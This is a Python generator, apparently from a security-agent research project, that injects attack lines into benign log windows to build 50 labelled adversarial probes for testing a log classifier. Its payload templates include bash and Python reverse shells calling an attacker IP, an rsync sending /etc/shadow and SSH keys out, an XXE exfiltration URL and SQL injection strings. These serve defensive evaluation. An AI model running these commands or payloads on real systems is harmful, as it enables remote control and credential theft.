#!/usr/bin/env python3
"""C1 最小对抗探针（log poisoning）构造器——3-1 批次

依据: ~/Mypaper/PDM4SecAgent/docs/02-执行交接/补充实验执行计划v2-20260927.md 批次3 3-1
用途: 纯数据构造（不动靶场容器、不启动攻击）。取 batch1 既有良性窗做骨架（只读），
     程序化注入攻击载荷（用户名/IP/路径字段注入、模板填充伪装），ground truth = 注入的攻击类别。

设计:
- 骨架池: range-data/batch1/windows/（E-4 normal-host 良性窗，396 个，只读）
- 50 个探针窗, 注入类别配比（对齐 C1 小节的三类伪装 + 高危覆盖）:
  * ssh_bruteforce_payload   12  良性 SSH 登录行里注入暴破特征（Failed password 连发）
  * cred_dump_tool           10  合法部署日志混入凭据转储工具名（mimikatz/procmon 等伪装成部署步骤）
  * reverse_shell_path       10  cron/备份任务描述里藏反弹 shell 路径（/dev/tcp、bash -i>&、mkfifo）
  * sqli_in_benign_field      8  良性 URL 参数字段注入 SQL 注入载荷
  * spray_disguised           6  多用户单密码低速喷洒伪装成例行巡检
  * xxe_in_config_log         4  良性配置读取日志里注入 XXE 实体外链
- 每窗: 随机选骨架（不重复使用超 2 次），随机行位注入 1-4 条载荷行，时间戳/上下文与骨架一致伪装
- 标签: labels.tactic = 注入攻击类别对应 tactic（credential_access/initial_access/credential_access/initial_access/credential_access/initial_access）,
  urgent/severity/action 按注入类别的高危档设置（探针都是高危注入，这正是要测门控的）
- meta.adv_probe: {injected_class, n_injected_lines, skeleton_window_id, seed} 全程可追溯
- window_stats 重算（复用 split_windows.window_stats 逻辑，保持同构）

用法: python3 gen_adversarial_probe.py [--seed 20260928]
输出: windows/*.jsonl (50) + PROBE-MANIFEST.json + 本脚本自身副本（可复算校验）
"""
import argparse, datetime, glob, hashlib, json, os, random, re, shutil, sys

RANGE_DIR = "/home/xxl/MySecAgent/range-data/batch1/windows"  # E-4 良性骨架池（只读）
OUT = "/home/xxl/MySecAgent/lab/experiments/oracle/EVAL/ADVERSARIAL-PROBE"

# ---------- 注入载荷模板 ----------
# {ts} 骨架行同款纳秒时间戳, {ip} 攻击源 IP 池随机, 其余字段伪装良性样式
ATTACK_SRC_POOL = ["172.28.0.2", "10.20.30.7", "192.168.44.9", "203.0.113.66", "172.28.0.2"]

PAYLOADS = {
    # 1) 良性 SSH 登录流里注入暴破特征：Failed password 连发 + invalid user 名单
    "ssh_bruteforce_payload": [
        "{ts} Failed password for {user} from {ip} port {port} ssh2",
        "{ts} Failed password for invalid user {user} from {ip} port {port} ssh2",
        "{ts} Connection from {ip} port {port} on 172.28.0.16 port 22 rdomain \"\"",
        "{ts} Disconnected from invalid user {user} {ip} port {port} [preauth]",
    ],
    # 2) 合法部署/运维日志混入凭据转储工具名（伪装成部署步骤/巡检）
    "cred_dump_tool": [
        "{ts} deploy: step 3/7 copying tools/mimikatz/x64/mimikatz.exe -> /opt/deploy/tools/ [ok]",
        "{ts} deploy: hash check sha256:...9f3b for secretsdump.py completed (stage=cred-sync)",
        "{ts} backup: including /var/backups/ntds.dit and SYSTEM hive in nightly image",
        "{ts} cron: job 'healthcheck' spawned /usr/local/bin/procmon -accepteula --dump creds",
        "{ts} ansible: task [deploy::utils] installs creddump7 via pip (changed)",
    ],
    # 3) cron/备份任务描述里藏反弹 shell 路径
    "reverse_shell_path": [
        "{ts} cron: (root) CMD (/usr/local/bin/backup.sh > /dev/null 2>&1; bash -i >& /dev/tcp/{ip}/4444 0>&1)",
        "{ts} cron: (www-data) CMD (python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",1337));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call([\"/bin/sh\"])')",
        "{ts} systemd: started session for user backup2 (runtime /dev/shm/.pty; tunnel mkfifo /tmp/.x;/bin/sh -i < /tmp/.x 2>&1 | nc {ip} 5555 > /tmp/.x)",
        "{ts} backup: rsync include=/etc/shadow,/root/.ssh -> relay@{ip}:/srv/backup/ (scheduled)",
    ],
    # 4) 良性 URL 参数字段注入 SQL 注入载荷
    "sqli_in_benign_field": [
        "{ip} - - [{nginx_ts}] \"GET /api/health?id=1' OR '1'='1 HTTP/1.1\" 200 512 \"-\" \"Mozilla/5.0 (X11; Linux x86_64) NormalBrowser/1.0\"",
        "{ip} - - [{nginx_ts}] \"GET /index.php?page=1 UNION SELECT username,password FROM users-- HTTP/1.1\" 200 1024 \"-\" \"Mozilla/5.0 NormalBrowser/1.0\"",
        "{ip} - - [{nginx_ts}] \"POST /search?q=1'; DROP TABLE sessions;-- HTTP/1.1\" 500 0 \"-\" \"Mozilla/5.0 NormalBrowser/1.0\"",
        "{ip} - - [{nginx_ts}] \"GET /item?cat=1 AND SLEEP(5)-- HTTP/1.1\" 200 256 \"-\" \"curl/7.88.1\"",
    ],
    # 5) 多用户单密码低速喷洒伪装成例行巡检（每条相隔数秒，特征=多用户同源失败）
    "spray_disguised": [
        "{ts} Failed password for {user} from {ip} port {port} ssh2",
        "{ts} Failed password for {user2} from {ip} port {port2} ssh2",
        "{ts} Failed password for {user3} from {ip} port {port2} ssh2",
    ],
    # 6) 良性配置读取日志里注入 XXE 实体外链
    "xxe_in_config_log": [
        "{ts} config: loading /etc/app/app.xml entity &xxtmp; resolved file:///etc/passwd",
        "{ts} xml-parse: external entity SYSTEM \"http://{ip}/collect?d=$(cat /etc/hostname)\" requested by parser",
        "{ts} config: DOCTYPE redefinition detected in /opt/app/conf.dtd (ENTITY secret SYSTEM \"file:///etc/shadow\")",
    ],
}

# 类别 -> ground truth 标签（tactic/urgent/severity/action 全档高危——探针本意是测高危样本的门控）
CLASS_LABELS = {
    "ssh_bruteforce_payload": dict(tactic="credential_access", urgent=True, severity="high", action="block_ip",
                                   evidence=dict(compromised=False, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
    "cred_dump_tool":         dict(tactic="credential_access", urgent=True, severity="high", action="isolate_host",
                                   evidence=dict(compromised=True, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
    "reverse_shell_path":     dict(tactic="command_and_control", urgent=True, severity="critical", action="isolate_host",
                                   evidence=dict(compromised=True, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
    "sqli_in_benign_field":   dict(tactic="initial_access", urgent=True, severity="high", action="block_ip",
                                   evidence=dict(compromised=False, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
    "spray_disguised":        dict(tactic="credential_access", urgent=True, severity="medium", action="monitor",
                                   evidence=dict(compromised=False, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
    "xxe_in_config_log":      dict(tactic="initial_access", urgent=True, severity="high", action="block_ip",
                                   evidence=dict(compromised=False, privilege_escalation=False, lateral_movement=False, data_exfil=False)),
}

QUOTA = {  # 共 50
    "ssh_bruteforce_payload": 12,
    "cred_dump_tool": 10,
    "reverse_shell_path": 10,
    "sqli_in_benign_field": 8,
    "spray_disguised": 6,
    "xxe_in_config_log": 4,
}

SPRAY_USERS = ["ops", "backup2", "monitor", "deploy", "clumsy", "git", "jenkins", "postgres"]
BRUTE_USERS = ["root", "admin", "test", "oracle", "ubuntu", "sysadmin", "guest", "pi", "kali", "service"]


def window_stats(lines):
    """与 split_windows.window_stats 同构（复制自 range/split_windows.py，保持一致性）"""
    fails = sum(1 for l in lines if "Failed password" in l or "authentication failure" in l)
    succ = sum(1 for l in lines if "Accepted " in l)
    users = re.findall(r"(?:for (?:invalid user )?)(\w+) from", " ".join(lines))
    uctr = {}
    for u in users: uctr[u] = uctr.get(u, 0) + 1
    ips = re.findall(r"from (\d+\.\d+\.\d+\.\d+)", " ".join(lines))
    ict = {}
    for i in ips: ict[i] = ict.get(i, 0) + 1
    for m in re.findall(r"^(\d+\.\d+\.\d+\.\d+) ", "\n".join(lines), re.M):
        ict[m] = ict.get(m, 0) + 1
    codes = re.findall(r'HTTP/[\d.]+\" (\d{3})', " ".join(lines))
    return {"n_lines": len(lines), "failed_logins": fails, "accepted_logins": succ,
            "unique_users": len(uctr), "unique_src_ips": len(ict),
            "top_users": dict(sorted(uctr.items(), key=lambda x: -x[1])[:3]),
            "top_ips": dict(sorted(ict.items(), key=lambda x: -x[1])[:3]),
            "http_2xx": sum(1 for c in codes if c.startswith("2")),
            "http_4xx": sum(1 for c in codes if c.startswith("4")),
            "http_5xx": sum(1 for c in codes if c.startswith("5"))}


def nginx_ts_like(rng, base_iso):
    """从骨架时间派生一个同日的 nginx combined 时间戳 [28/Sep/2026:14:03:02 +0000]"""
    try:
        t = datetime.datetime.fromisoformat(base_iso.replace("Z", ""))
    except Exception:
        t = datetime.datetime(2026, 9, 28, 12, 0, 0)
    t += datetime.timedelta(seconds=rng.randint(1, 120))
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


def ts_like(rng, ref_line):
    """按骨架行首时间戳样式生成纳秒级伪装时间戳（相邻 ± 数秒）"""
    m = re.match(r"(\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2})(\.\d+)?Z", ref_line or "")
    if not m:
        return "2026-09-22T12:40:00.000000000Z"
    t = datetime.datetime.fromisoformat(m.group(1))
    frac = (m.group(2) or ".000000000")[1:].ljust(9, "0")
    ns = int(frac[:9]) + rng.randint(-800_000_000, 800_000_000)
    if ns < 0: ns += 1_000_000_000; t -= datetime.timedelta(seconds=1)
    if ns >= 1_000_000_000: ns -= 1_000_000_000; t += datetime.timedelta(seconds=1)
    return t.strftime("%Y-%m-%dT%H:%M:%S") + f".{ns:09d}Z"


def render(payload_tmpl, rng, ref_line):
    """把载荷模板渲染成与骨架一致的伪装行"""
    ip = rng.choice(ATTACK_SRC_POOL)
    v = {
        "ts": ts_like(rng, ref_line),
        "nginx_ts": nginx_ts_like(rng, ref_line or ""),
        "ip": ip,
        "port": str(rng.randint(40000, 60000)),
        "port2": str(rng.randint(40000, 60000)),
        "user": rng.choice(BRUTE_USERS),
        "user2": rng.choice([u for u in SPRAY_USERS]),
        "user3": rng.choice([u for u in SPRAY_USERS if True]),
    }
    return payload_tmpl.format(**v)


def pick_skeletons(rng, n, max_reuse=2):
    """良性骨架池（只读）随机抽样，每窗最多复用 2 次。
    2026-09-28 修复: batch1/windows/ 含多容器剧本切窗（normal-host 目录里也有 e1/e2 攻击窗），
    必须按 labels.tactic=='benign' 过滤——骨架口径=纯良性（抽查曾发现 xxe 攻击窗混入）。"""
    pool = [f for f in sorted(glob.glob(f"{RANGE_DIR}/*.jsonl"))
            if json.loads(open(f).read()).get("labels", {}).get("tactic") == "benign"]
    assert pool, f"良性骨架池为空: {RANGE_DIR}"
    use = {}
    picked = []
    while len(picked) < n:
        f = rng.choice(pool)
        if use.get(f, 0) >= max_reuse:
            continue
        use[f] = use.get(f, 0) + 1
        picked.append(f)
    return picked


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--seed", type=int, default=20260928)
    args = ap.parse_args()
    rng = random.Random(args.seed)

    wdir = f"{OUT}/windows"
    os.makedirs(wdir, exist_ok=True)
    for f in glob.glob(f"{wdir}/*.jsonl"):
        os.remove(f)  # 可复算：重跑先清

    plan = [c for c, k in QUOTA.items() for _ in range(k)]
    rng.shuffle(plan)
    skeletons = pick_skeletons(rng, len(plan))

    manifest = {"seed": args.seed, "generator": os.path.basename(__file__),
                "skeleton_pool": RANGE_DIR, "quota": QUOTA, "windows": []}
    for i, (cls, sk_path) in enumerate(zip(plan, skeletons)):
        sk = json.loads(open(sk_path).read())
        lines = list(sk["state"]["raw_log_lines"])
        tpls = PAYLOADS[cls]
        n_inj = rng.randint(2, 4) if cls != "spray_disguised" else 3
        # 注入位置: 随机行位（避免只堆尾部被模型按位置捷径识别）
        idxs = sorted(rng.sample(range(len(lines) + 1), k=min(n_inj, len(lines) + 1)), reverse=True)
        injected = []
        for pos in idxs:
            ref = lines[min(pos, len(lines) - 1)] if lines else ""
            # spray: 一条模板含 3 行，逐行渲染插入
            rendered = [render(t, rng, ref) for t in (tpls if cls == "spray_disguised" else rng.sample(tpls, k=1))]
            for r_line in rendered:
                injected.append(r_line)
                lines.insert(pos, r_line)
        lines = lines[:100]  # 与 split_windows 同样截断到 100 行
        # 截断保注入: 截断后若无任何注入行幸存(注入位靠前被挤出/载荷行特征缺失)，强制在尾部补 1 条
        inj_survived = sum(1 for l in lines if l in injected)
        if inj_survived == 0 and lines:
            lines = lines[:-1] + [injected[0]]
        wid = f"adv-{cls}-{datetime.datetime.utcnow().strftime('%Y%m%d-%H%M%S')}-{i:04d}"
        lab = dict(CLASS_LABELS[cls])
        rec = {
            "window_id": wid, "batch": "adv-probe", "scenario": f"adv_{cls}",
            "kind": cls, "intensity": "stealth", "outcome": "injected",
            "time_range": sk["time_range"],
            "state": {"raw_log_lines": lines, "window_stats": window_stats(lines)},
            "labels": lab,
            "meta": {"tool": "adversarial-injector", "src_ips": sorted({ip for ip in ATTACK_SRC_POOL}),
                     "adv_probe": {"injected_class": cls, "n_injected_lines": len(injected),
                                   "skeleton_window_id": sk["window_id"],
                                   "skeleton_labels_tactic": sk["labels"]["tactic"], "seed": args.seed}},
        }
        with open(f"{wdir}/{wid}.jsonl", "w") as f:
            f.write(json.dumps(rec, ensure_ascii=False) + "\n")
        manifest["windows"].append({"window_id": wid, "class": cls, "skeleton": sk["window_id"],
                                    "n_injected": len(injected), "n_lines": len(lines),
                                    "gt_tactic": lab["tactic"]})
    with open(f"{OUT}/PROBE-MANIFEST.json", "w") as f:
        json.dump(manifest, f, ensure_ascii=False, indent=1)
    # 脚本自身副本（可复算证明）；本就位于 OUT 内则跳过
    src = os.path.abspath(__file__)
    dst = f"{OUT}/gen_adversarial_probe.py"
    if os.path.realpath(src) != os.path.realpath(dst):
        shutil.copy2(src, dst)
    # 统计
    from collections import Counter
    c = Counter(w["class"] for w in manifest["windows"])
    print(f"== 探针 {len(manifest['windows'])} 窗 -> {wdir}")
    for k, v in sorted(c.items()):
        print(f"  {k}: {v}")
    print(f"骨架复用分布: {Counter(os.path.basename(s) for s in skeletons).most_common(3)} ... (每窗≤2 次)")


if __name__ == "__main__":
    main()
